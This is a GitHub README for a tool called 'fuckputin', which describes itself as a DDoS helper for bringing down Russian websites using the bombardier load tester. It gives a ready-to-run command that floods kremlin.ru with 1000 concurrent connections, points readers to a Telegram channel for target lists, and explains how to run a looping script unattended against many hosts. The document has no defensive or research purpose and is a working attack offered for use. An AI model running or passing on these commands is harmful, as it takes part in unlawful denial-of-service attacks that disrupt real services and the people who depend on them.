# fuckputin

🇺🇦 A DDoS helper tool to bring down enemy websites - based on [bombardier](https://github.com/codesenberg/bombardier) 🇺🇦

### [Інструкція українською](./README_UA.md)

### Simplified instruction - manual execution
- Install Docker - [Instructions](https://docs.docker.com/get-docker/)
- `docker run -it alpine/bombardier -c 1000 -d 60s -l https://kremlin.ru`
- Last part of the comand is host url, you should pick one [from the last chat messages](https://t.me/itarmyofukraine2022)  

Automatic script performs the same command and loops through a list of hosts, so you can leave it unsupervised overnight or for long periods of time

### Get the code
- Clone the repo - `git clone https://github.com/v1adko/fuckputin.git`   
  or  
[download a zip](https://github.com/v1adko/fuckputin/archive/refs/heads/master.zip) if git clone is taking too long
- Change working directory - `cd ./fuckputin`
- Optionally update [the targets](#targets)

### Targets

Best update targets from [this telegram channel](https://t.me/itarmyofukraine2022)  
Edit contents of the [./fuckputin.sh](/fuckputin.sh) file

### Docker

*Note*: this could take quite some time, if you're tech-savvy enough,  
try [installing binaries manually](#local) directly on your host system,  
it should be faster

- Install Docker - [Instructions](https://docs.docker.com/get-docker/)
- Optionally update [the targets](#targets)
- `docker-compose up --build` (on some systems compose is not installed with docker)
   **or**
- `docker build -t fuckputin .`
- `docker run fuckputin`

### Local

- Install Go - [Instructions](https://go.dev/doc/install)
- Install bombardier [by downloading a binary](https://github.com/codesenberg/bombardier/releases)
- Run `./fuckputin-local.sh`

### Run

Now leave the process running for as much as you can or until you need to update the targets  
Thank you for fighting on our side! 💪 🇺🇦
